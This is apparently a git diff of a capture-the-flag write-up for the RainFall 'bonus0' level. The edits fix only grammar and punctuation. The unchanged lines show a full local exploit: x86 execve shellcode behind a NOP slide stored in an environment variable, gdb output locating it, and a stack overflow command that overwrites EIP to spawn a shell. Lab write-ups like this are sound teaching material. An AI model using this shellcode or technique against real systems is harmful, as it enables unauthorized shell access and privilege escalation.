@@ -20,17 +20,17 @@ Breakpoint 1, 0x080485c0 in main ()
 (gdb) c
 Continuing.
 aaaaaaaaaaaaaaaaaaaaabb bb
-Inferior 1 (process 5768) exited normally]
+[Inferior 1 (process 5768) exited normally]
 ```
 We can see that the b string is repeated twice.
 
 ## Using the env
-Let's put our [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) after a safety NOP slide into the env, we'll try to replace it's address with `EIP` afterwards
+Let's put our [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) after a safety NOP slide into the env, we'll try to replace its address with `EIP` afterwards.
 
 ```shell
 export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
-Let's now get it's address within gdb and add some margin, this will keep it working even if the env changes slightly.
+Let's now get its address within gdb and add some margin, this will keep it working even if the env changes slightly.
 
 ```shell
 bonus0@RainFall:~$ gdb -q ./bonus0 
@@ -44,11 +44,11 @@ Breakpoint 1, 0x080485a7 in main ()
 (gdb) p (char*)getenv("PWN")
 $1 = 0xbffffd2c "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
 ```
-The address of PWN in gdb's env is 0xbffffd2c, let's give ourselves a margin of 0x40 -> 0xBFFFFD6C
+The address of PWN in gdb's env is 0xbffffd2c, let's give ourselves a margin of 0x40 -> 0xBFFFFD6C.
 
-Let's now replace EIP with that address
+Let's now replace EIP with that address.
 ```shell
 bonus0@RainFall:~$ (python -c 'print "a"*20'; python -c 'print "b"*14 + "\x6c\xfd\xff\xbfa"'; cat -) | ./bonus0 
-address is within the env to account for changes
+# The address is within the env to account for changes.
 ```
 Bingo!
